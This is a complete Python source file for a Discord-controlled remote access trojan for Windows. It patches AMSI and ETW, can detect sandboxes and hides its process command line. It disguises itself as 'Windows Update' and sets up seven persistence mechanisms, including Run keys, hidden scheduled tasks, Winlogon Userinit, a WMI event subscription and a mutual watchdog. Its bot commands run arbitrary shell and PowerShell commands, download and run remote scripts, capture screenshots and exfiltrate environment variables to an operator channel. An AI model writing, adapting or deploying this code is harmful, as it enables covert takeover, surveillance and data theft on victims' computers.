import os
import sys
import asyncio
import subprocess
import platform
import uuid
import socket
import io
import ctypes
import time
import tempfile
import re

# ======================== CONFIGURATION ========================
def _d(h, k):
    return bytes(b ^ k for b in bytes.fromhex(h)).decode()

BOT_TOKEN     = _d("677e7f50677e671a67506b1e64404d1b647e631867406750656b046d41726b655e044c67636f7049437a7f1a4647534f5f184e4c124b1e69656059796e646512704f5d4263614945", 0x2A)
GUILD_ID      = 1531344310581072044
CATEGORY_NAME = "things"
CMD_TIMEOUT   = 60

# Set to False on actual engagement to enable sandbox/VM evasion
ALLOW_VM_EXECUTION = True 
# ===============================================================

CREATE_NO_WINDOW  = 0x08000000
DETACHED_PROCESS  = 0x00000008
SW_HIDE           = 0

_mutex_handle = None
ADS_FILE      = r"C:\ProgramData:winupdate_ads.py" # Hidden in Alternate Data Stream

# PowerShell AMSI/ETW Bypass payload to prepend to all PS commands
PS_BYPASSES = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('m_enabled','NonPublic,Static').SetValue($null,0);
"""


# ── in-memory ETW/AMSI patching (native process) ────────────────
def disable_etw_amsi_native():
    if sys.platform != 'win32': return
    try:
        kernel32 = ctypes.windll.kernel32
        old_prot = ctypes.c_ulong(0)
        
        # ETW Patch: patch ntdll!EtwEventWrite to immediately return 0
        try:
            ntdll = ctypes.windll.ntdll
            etw_addr = ctypes.cast(ntdll.EtwEventWrite, ctypes.c_void_p).value
            # xor rax, rax; ret
            patch = b'\x48\x31\xc0\xc3'
            kernel32.VirtualProtect(etw_addr, len(patch), 0x40, ctypes.byref(old_prot))
            ctypes.memmove(etw_addr, patch, len(patch))
            kernel32.VirtualProtect(etw_addr, len(patch), old_prot.value, ctypes.byref(old_prot))
        except Exception:
            pass

        # AMSI Patch: patch amsi.dll!AmsiScanBuffer to return E_INVALIDARG
        try:
            amsi = ctypes.windll.amsi
            amsi_addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
            # mov eax, 0x80070057; ret
            patch = b'\xB8\x57\x00\x07\x80\xC3'
            kernel32.VirtualProtect(amsi_addr, len(patch), 0x40, ctypes.byref(old_prot))
            ctypes.memmove(amsi_addr, patch, len(patch))
            kernel32.VirtualProtect(amsi_addr, len(patch), old_prot.value, ctypes.byref(old_prot))
        except Exception:
            pass
    except Exception:
        pass


# ── sandbox/vm evasion ──────────────────────────────────────────
def check_sandbox():
    if ALLOW_VM_EXECUTION:
        return False
        
    try:
        # Check usernames commonly used in sandboxes
        user = os.environ.get('USERNAME', '').lower()
        sandbox_users = ['sandbox', 'malware', 'virus', 'cuckoo', 'sample', 'test']
        if any(u in user for u in sandbox_users): return True
        
        # Check MAC address OUIs for common VMs
        mac = uuid.getnode()
        mac_hex = f"{mac:012x}"
        oui = mac_hex[:6]
        vm_ouis = ['000569', '080027', '005056', '001c42', '000c29', '001c14', '00505c']
        if oui in vm_ouis: return True
        
        # Check for sandbox processes
        proc = subprocess.run('wmic process get name', capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
        procs = proc.stdout.lower()
        sandbox_procs = ['sbiedll', 'cuckoo', 'vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'xenservice']
        if any(p in procs for p in sandbox_procs): return True
            
        # Check for small disk size (sandboxes usually use 60GB or less)
        free_bytes = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
        if free_bytes.value < 60 * 1024 * 1024 * 1024:
            return True
            
    except Exception:
        pass
    return False


# ── wipe command line from PEB (memory stealth) ─────────────────
def wipe_command_line():
    if sys.platform != 'win32' or sys.maxsize <= 2**32:
        return # Only works on 64-bit Python
    try:
        ntdll = ctypes.windll.ntdll
        
        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [("Length", ctypes.c_ushort), ("MaximumLength", ctypes.c_ushort), ("Buffer", ctypes.c_wchar_p)]
            
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [("Reserved1", ctypes.c_void_p), ("PebBaseAddress", ctypes.c_void_p), 
                        ("Reserved2", ctypes.c_void_p * 2), ("UniqueProcessId", ctypes.c_void_p), 
                        ("Reserved3", ctypes.c_void_p)]
            
        pbi = PROCESS_BASIC_INFORMATION()
        ntdll.NtQueryInformationProcess(-1, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
        
        # PEB -> ProcessParameters (offset 0x20 on x64)
        proc_params_addr = ctypes.c_void_p.from_address(pbi.PebBaseAddress + 0x20).value
        
        # ProcessParameters -> CommandLine (UNICODE_STRING at offset 0x70 on x64)
        cmdline_us = UNICODE_STRING.from_address(proc_params_addr + 0x70)
        
        if cmdline_us.Length > 0:
            kernel32 = ctypes.windll.kernel32
            old_prot = ctypes.c_ulong(0)
            # Wipe the buffer memory
            kernel32.VirtualProtect(ctypes.c_void_p(cmdline_us.Buffer), cmdline_us.Length, 0x40, ctypes.byref(old_prot))
            ctypes.memset(ctypes.c_wchar_p(cmdline_us.Buffer), 0, cmdline_us.Length)
            kernel32.VirtualProtect(ctypes.c_void_p(cmdline_us.Buffer), cmdline_us.Length, old_prot.value, ctypes.byref(old_prot))
            
            # Zero out the length
            kernel32.VirtualProtect(ctypes.byref(cmdline_us), 2, 0x40, ctypes.byref(old_prot))
            ctypes.memset(ctypes.byref(cmdline_us), 0, 2)
            kernel32.VirtualProtect(ctypes.byref(cmdline_us), 2, old_prot.value, ctypes.byref(old_prot))
    except Exception:
        pass


# ── silent window hide ──────────────────────────────────────────
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE)
    except Exception:
        pass


# ── auto-install dependencies ───────────────────────────────────
def ensure_packages():
    required = {
        'discord':  'discord.py',
        'requests': 'requests',
        'PIL':      'pillow',
        'aiohttp':  'aiohttp',
    }
    for module, package in required.items():
        try:
            __import__(module)
        except ImportError:
            try:
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', package,
                     '--quiet', '--disable-pip-version-check'],
                    capture_output=True,
                    creationflags=CREATE_NO_WINDOW,
                    timeout=120
                )
            except Exception:
                pass
        except Exception:
            pass


hide_console()
disable_etw_amsi_native()
if check_sandbox():
    sys.exit(0)
ensure_packages()

import discord
from discord.ext import commands
import requests
import aiohttp
from PIL import ImageGrab


# ── host identification ─────────────────────────────────────────
def get_host_id():
    hostname = socket.gethostname()
    mac = uuid.getnode()
    return f"host-{hostname.lower()}-{mac & 0xFFFF:04x}"

HOST_ID      = get_host_id()
APPDATA      = os.environ.get('APPDATA', os.path.expanduser('~'))
PERSIST_DIR  = os.path.join(APPDATA, 'Microsoft', 'Windows', 'Update')
PERSIST_FILE = os.path.join(PERSIST_DIR, 'winupdate.py')


# ── mutex: prevent duplicate instances ──────────────────────────
def acquire_mutex():
    global _mutex_handle
    try:
        name = f"Global\\WinUpdate_{HOST_ID}"
        _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except Exception:
        pass


# ── sanitize Discord channel name ───────────────────────────────
def sanitize_channel_name(name):
    name = name.lower()
    name = re.sub(r'[^a-z0-9-_]', '-', name)
    name = re.sub(r'-+', '-', name).strip('-')
    return name[:95] or 'host-unknown'


# ── persistence (VAULT OCEAN NUCLEAR PASTA) ─────────────────────
def install_persistence():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)

        is_frozen = getattr(sys, 'frozen', False)
        current_path = sys.executable if is_frozen else (os.path.abspath(sys.argv[0]) if sys.argv[0] else os.path.abspath(__file__))

        # ── The Vault: Hide payload in Alternate Data Stream ─────
        # ADS doesn't show up in standard dir listings
        try:
            if current_path.lower() != ADS_FILE.lower():
                if is_frozen:
                    import shutil
                    shutil.copy2(current_path, ADS_FILE)
                else:
                    with open(current_path, 'r', encoding='utf-8', errors='ignore') as f:
                        src = f.read()
                    with open(ADS_FILE, 'w', encoding='utf-8', errors='ignore') as f:
                        f.write(src)
        except Exception:
            pass

        # Fallback if ADS fails, use regular file
        target_payload = ADS_FILE if os.path.exists(ADS_FILE) else PERSIST_FILE
        if not os.path.exists(target_payload):
            try:
                if is_frozen:
                    import shutil
                    shutil.copy2(current_path, target_payload)
                else:
                    with open(current_path, 'r', encoding='utf-8', errors='ignore') as f:
                        src = f.read()
                    with open(target_payload, 'w', encoding='utf-8') as f:
                        f.write(src)
            except Exception:
                pass

        if not os.path.isfile(target_payload):
            return

        pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.isfile(pythonw):
            pythonw = sys.executable

        # ── Layer 1 — Registry Run key ───────────────────────────
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r'Software\Microsoft\Windows\CurrentVersion\Run',
                                0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ,
                                  f'"{pythonw}" "{target_payload}"')
        except Exception:
            pass

        # ── Layer 2 — Scheduled Tasks via XML import ─────────────
        try:
            task_xml_logon = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Windows Update</Description><URI>\\WindowsUpdateTask</URI></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority>
  </Settings>
  <Actions Context="Author"><Exec><Command>{pythonw}</Command><Arguments>"{target_payload}"</Arguments></Exec></Actions>
</Task>'''

            task_xml_interval = task_xml_logon.replace(
                '<LogonTrigger><Enabled>true</Enabled></LogonTrigger>',
                '<TimeTrigger><Repetition><Interval>PT30M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>2020-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger>'
            ).replace('\\WindowsUpdateTask', '\\WindowsUpdateCheck')

            for task_name, task_xml in [('WindowsUpdateTask', task_xml_logon), ('WindowsUpdateCheck', task_xml_interval)]:
                fd, xml_path = tempfile.mkstemp(suffix='.xml', prefix='task_')
                try:
                    os.write(fd, task_xml.encode('utf-16-le'))
                    os.close(fd)
                    subprocess.run(f'schtasks /Create /TN "{task_name}" /XML "{xml_path}" /F', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
                except Exception:
                    pass
                finally:
                    try: os.remove(xml_path)
                    except: pass
        except Exception:
            pass

        # ── Layer 3 — Startup folder VBS launcher ────────────────
        try:
            startup = os.path.join(APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            os.makedirs(startup, exist_ok=True)
            vbs_path = os.path.join(startup, 'WindowsUpdate.vbs')
            vbs_content = f'CreateObject("WScript.Shell").Run """{pythonw}"" ""{target_payload}""", 0, False'
            with open(vbs_path, 'w') as f:
                f.write(vbs_content)
        except Exception:
            pass

        # ── Layer 4 — UserInitMprLogonScript ─────────────────────
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Environment', 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, 'UserInitMprLogonScript', 0, winreg.REG_SZ, f'"{pythonw}" "{target_payload}"')
        except Exception:
            pass

        # ── Layer 5 — Winlogon Userinit (System level if Admin) ──
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                import winreg
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 0, winreg.KEY_QUERY_VALUE | winreg.KEY_SET_VALUE) as key:
                    current, _ = winreg.QueryValueEx(key, 'Userinit')
                    target_cmd = f'"{pythonw}" "{target_payload}"'
                    if target_cmd not in current:
                        new_val = current.rstrip(',') + ',' + target_cmd
                        winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, new_val)
        except Exception:
            pass

        # ── Layer 6 — WMI Permanent Event Subscription ───────────
        # Runs inside WmiPrvSE.exe, triggers whenever explorer.exe restarts
        try:
            ps_command = f'''
            $filter = Set-WmiInstance -Class __EventFilter -Namespace "root/subscription" -Arguments @{{Name="WinUpdateFilter"; EventNameSpace="root/cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"}}
            $consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root/subscription" -Arguments @{{Name="WinUpdateConsumer"; ScriptingEngine="VBScript"; ScriptText="Set sh=CreateObject(""WScript.Shell""):sh.Run ""{pythonw} \""{target_payload}\"""",0,False"}}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root/subscription" -Arguments @{{Filter=$filter; Consumer=$consumer}}
            '''
            subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps_command], capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
        except Exception:
            pass

        # ── Layer 7 — The Watchdog (Mutual Monitoring) ───────────
        # VBS script monitors Python. Python monitors VBS.
        try:
            watchdog_vbs = os.path.join(PERSIST_DIR, 'wincheck.vbs')
            vbs_content = (
                f'On Error Resume Next\n'
                f'Set objWMI = GetObject("winmgmts:\\\\.\\root\\cimv2")\n'
                f'Do While True\n'
                f'    Set procs = objWMI.ExecQuery("Select * From Win32_Process Where Name=\'pythonw.exe\'")\n'
                f'    found = False\n'
                f'    For Each p In procs\n'
                f'        If InStr(1, p.CommandLine, "winupdate_ads.py", 1) > 0 Then\n'
                f'            found = True\n'
                f'            Exit For\n'
                f'        End If\n'
                f'    Next\n'
                f'    If Not found Then\n'
                f'        Set sh = CreateObject("WScript.Shell")\n'
                f'        sh.Run "{pythonw} ""{target_payload}""", 0, False\n'
                f'    End If\n'
                f'    WScript.Sleep 30000\n'
                f'Loop\n'
            )
            with open(watchdog_vbs, 'w') as f:
                f.write(vbs_content)
            # Launch the watchdog silently
            subprocess.Popen(['wscript.exe', watchdog_vbs], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass

    except Exception:
        pass


# ════════════════════════════════════════════════════════════════
#  ASYNC COMMAND RUNNERS — NOTHING BLOCKS THE EVENT LOOP
# ════════════════════════════════════════════════════════════════

async def async_cmd(command):
    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=CREATE_NO_WINDOW
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=CMD_TIMEOUT)
            out = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
            return out.strip() if out.strip() else "[no output]"
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return f"[timed out after {CMD_TIMEOUT}s — process killed]"
    except Exception as e:
        return f"[error: {e}]"


async def async_powershell(command):
    try:
        # Prepend AMSI/ETW bypasses to EVERY powershell command
        full_command = f'{PS_BYPASSES} {command}'
        proc = await asyncio.create_subprocess_exec(
            'powershell', '-NoProfile', '-NonInteractive',
            '-WindowStyle', 'Hidden', '-Command', full_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=CREATE_NO_WINDOW
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=CMD_TIMEOUT)
            out = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
            return out.strip() if out.strip() else "[no output]"
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return f"[timed out after {CMD_TIMEOUT}s — process killed]"
    except Exception as e:
        return f"[error: {e}]"


async def async_pyrun(url):
    tmp_path = None
    bat_path = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                if resp.status != 200:
                    return f"[download failed: HTTP {resp.status}]"
                script_bytes = await resp.read()

        tmp_fd, tmp_path = tempfile.mkstemp(suffix='.py', prefix='pyrun_')
        os.write(tmp_fd, script_bytes)
        os.close(tmp_fd)

        pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.isfile(pythonw):
            pythonw = sys.executable

        bat_fd, bat_path = tempfile.mkstemp(suffix='.bat', prefix='pyrun_')
        bat_content = (
            f'@echo off\r\n'
            f'"{pythonw}" "{tmp_path}"\r\n'
            f'del "{tmp_path}"\r\n'
            f'del "%~f0"\r\n'
        )
        os.write(bat_fd, bat_content.encode('utf-8'))
        os.close(bat_fd)

        subprocess.Popen(
            ['cmd', '/c', bat_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
            creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW, close_fds=True
        )
        return f"[pyrun launched: `{os.path.basename(tmp_path)}` — detached, self-cleaning]"
    except asyncio.TimeoutError:
        return "[download timed out after 30s]"
    except Exception as e:
        for p in (tmp_path, bat_path):
            if p and os.path.exists(p):
                try: os.remove(p)
                except: pass
        return f"[pyrun error: {e}]"


async def async_screenshot():
    def _grab():
        try:
            shot = ImageGrab.grab()
            buf = io.BytesIO()
            shot.save(buf, format='PNG')
            buf.seek(0)
            return buf
        except Exception:
            return None
    return await asyncio.get_running_loop().run_in_executor(None, _grab)


def get_env_vars():
    lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
    return '\n'.join(lines)


def make_txt_file(text, filename):
    buf = io.BytesIO(text.encode('utf-8', errors='replace'))
    return discord.File(buf, filename=filename)


# ── Discord bot ─────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
_ready_once = False


async def watchdog_loop():
    """Monitors the VBS watchdog. If it dies, relaunches it."""
    watchdog_vbs = os.path.join(PERSIST_DIR, 'wincheck.vbs')
    while True:
        await asyncio.sleep(45)
        try:
            # Check if wscript is running our wincheck.vbs
            res = await async_cmd('wmic process where "name=\'wscript.exe\'" get CommandLine /format:list')
            if 'wincheck.vbs' not in res.lower():
                if os.path.exists(watchdog_vbs):
                    subprocess.Popen(['wscript.exe', watchdog_vbs], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


async def ensure_channel():
    guild = None
    for attempt in range(3):
        guild = bot.get_guild(GUILD_ID)
        if guild: break
        try:
            guild = await bot.fetch_guild(GUILD_ID)
            if guild: break
        except Exception:
            pass
        await asyncio.sleep(2)

    if not guild: return None

    try: await guild.fetch_channels()
    except Exception: pass

    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    if not category:
        try: category = await guild.create_category(CATEGORY_NAME)
        except Exception: return None

    channel_name = sanitize_channel_name(HOST_ID)
    channel = discord.utils.get(guild.text_channels, name=channel_name)

    if channel:
        if channel.category_id != category.id:
            try: await channel.edit(category=category)
            except Exception: pass
    else:
        try: channel = await guild.create_text_channel(channel_name, category=category)
        except Exception: return None

    return channel


@bot.event
async def on_ready():
    global _ready_once
    if _ready_once: return
    _ready_once = True

    await asyncio.sleep(1)

    # Start the mutual watchdog in the background
    bot.loop.create_task(watchdog_loop())

    ch = await ensure_channel()
    if ch:
        await ch.send(
            f"🟢 **Host online:** `{HOST_ID}`\n"
            f"OS: {platform.system()} {platform.release()}\n"
            f"User: `{os.environ.get('USERNAME', 'unknown')}`\n"
            f"Admin: `{bool(ctypes.windll.shell32.IsUserAnAdmin())}`"
        )


@bot.event
async def on_message(message):
    if message.author == bot.user: return
    ch_name = getattr(message.channel, 'name', None)
    if ch_name != sanitize_channel_name(HOST_ID): return
    await bot.process_commands(message)


@bot.event
async def on_command_error(ctx, error):
    pass


# ── commands ────────────────────────────────────────────────────
@bot.command()
async def help(ctx):
    await ctx.send(
        "**Commands:**\n"
        "`!help` — Show this message\n"
        "`!screenshot` — Capture screenshot\n"
        "`!cmd <command>` — Run CMD (async, non-blocking)\n"
        "`!powershell <command>` — Run PowerShell (AMSI/ETW bypassed, non-blocking)\n"
        "`!pyrun <url>` — Download & run .py (fully detached process)\n"
        "`!env` — Dump environment variables (.txt)"
    )

@bot.command()
async def screenshot(ctx):
    buf = await async_screenshot()
    if buf: await ctx.send(file=discord.File(buf, filename='screen.png'))
    else: await ctx.send("[screenshot failed]")

@bot.command()
async def cmd(ctx, *, command: str = ""):
    if not command: return
    out = await async_cmd(command)
    if len(out) > 1900: await ctx.send(file=make_txt_file(out, 'cmd_output.txt'))
    else: await ctx.send(f"```\n{out}\n```")

@bot.command()
async def powershell(ctx, *, command: str = ""):
    if not command: return
    out = await async_powershell(command)
    if len(out) > 1900: await ctx.send(file=make_txt_file(out, 'ps_output.txt'))
    else: await ctx.send(f"```\n{out}\n```")

@bot.command()
async def pyrun(ctx, *, url: str = ""):
    if not url: return
    result = await async_pyrun(url)
    await ctx.send(result)

@bot.command()
async def env(ctx):
    data = await asyncio.get_running_loop().run_in_executor(None, get_env_vars)
    await ctx.send(file=make_txt_file(data, 'env.txt'))


# ── entry point ─────────────────────────────────────────────────
def main():
    acquire_mutex()
    install_persistence()
    wipe_command_line() # Erase our tracks from process memory
    import logging
    logging.disable(logging.CRITICAL)
    while True:
        try:
            bot.run(BOT_TOKEN)
        except Exception:
            time.sleep(30)

if __name__ == '__main__':
    main()